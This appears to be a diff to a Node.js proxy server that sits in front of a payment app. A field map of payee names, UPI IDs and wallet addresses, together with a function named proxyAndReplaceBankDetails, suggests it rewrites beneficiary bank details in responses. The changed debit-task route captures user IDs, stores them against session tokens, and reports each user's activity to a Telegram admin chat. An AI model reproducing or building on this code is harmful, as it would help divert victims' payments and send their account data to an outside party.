@@ -319,7 +319,7 @@ const BANK_FIELDS = {
   'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
   'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder',
   'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
-  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
+  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder',
   'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
   'payeecardname': 'accountHolder', 'receivecardname': 'accountHolder', 'receivercardname': 'accountHolder',
   'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
@@ -331,7 +331,7 @@ const BANK_FIELDS = {
   'bankname': 'bankName', 'bank_name': 'bankName',
   'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
   'collectionbankname': 'bankName',
-  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
+  'upiid': 'upiId', 'upi_id': 'upiId', 'vpa': 'upiId',
   'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
   'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
   'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
@@ -959,7 +959,18 @@ app.all('/app/bank/debit/update/switch', async (req, res) => {
 });
 
 app.all('/app/pay/debit/task', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '💸 Debit Task');
+  try {
+    const data = await loadData();
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) saveTokenUserId(req, userId);
+    sendJson(res, respHeaders, jsonResp, respBody);
+    if (!isLogOff(data, userId) && data.adminChatId && bot) {
+      const respData = getResponseData(jsonResp);
+      const taskCount = Array.isArray(respData) ? respData.length : (respData && respData.list ? respData.list.length : '?');
+      bot.sendMessage(data.adminChatId, `💸 Debit Task [${userId || 'N/A'}] Tasks: ${taskCount}`).catch(()=>{});
+    }
+  } catch(e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/pay/debit/upis', async (req, res) => {
